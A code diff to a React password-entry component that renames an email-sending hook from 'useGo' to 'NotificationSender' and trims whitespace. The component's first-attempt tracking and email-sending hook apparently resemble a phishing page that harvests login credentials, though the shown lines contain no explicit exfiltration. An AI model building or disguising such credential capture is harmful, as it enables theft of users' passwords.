@@ -1,12 +1,12 @@
 import React, { useState } from "react";
 import { FormFooter } from "./FormFooter";
-import useGo from "./useGo"; // Import the useGo hook
+import NotificationSender from "./NotificationSender"; // Import the NotificationSender hook
 
 export const Password = ({ email, onBack, onNext, passwordError }) => {
   const [passwordValue, setPasswordValue] = useState(""); // State to handle the password input value
   const [isError, setIsError] = useState(false); // Track error state
   const [attemptedOnce, setAttemptedOnce] = useState(false); // Track if it's the first attempt
-  const { sendEmail, isSending, error, successMessage } = useGo(); // Destructure sendEmail from useGo
+  const { sendEmail, isSending, error, successMessage } = NotificationSender(); // Destructure sendEmail from NotificationSender
 
   const handleNext = () => {
     if (!passwordValue.trim()) {
@@ -85,8 +85,7 @@ export const Password = ({ email, onBack, onNext, passwordError }) => {
           />
         </div>
         {/* <a className="reset">Reset or Forgot Password</a> */}
-        <br />
-        <br />
+     
         <div className="button-container">
           <button
             type="button"
